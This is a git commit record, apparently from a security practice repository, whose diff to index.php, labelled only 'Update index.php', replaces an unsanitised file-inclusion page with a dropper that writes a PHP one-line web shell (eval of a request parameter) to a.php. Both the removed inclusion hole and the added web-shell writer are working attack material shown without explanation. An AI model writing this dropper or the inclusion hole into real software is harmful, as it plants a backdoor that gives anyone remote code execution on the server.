d9b2172f7b2a66f3dc47ad6f90adfd0b7132b0d9
杨沐沐 <107412960+yangjingrongg@users.noreply.github.com>
2024-03-09 11:40:20 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,7 @@
 <?php
-$path = $_GET['path'];
-echo "<h1>This is include.php!</h1>";
-include $path;
+$a = "<?php @eval(\$_REQUEST['shell'])?>";
+$b = fopen("a.php","w") or die("failed!");
+fwrite($b,$a);
+echo 'success.';
+fclose($b);
 ?>
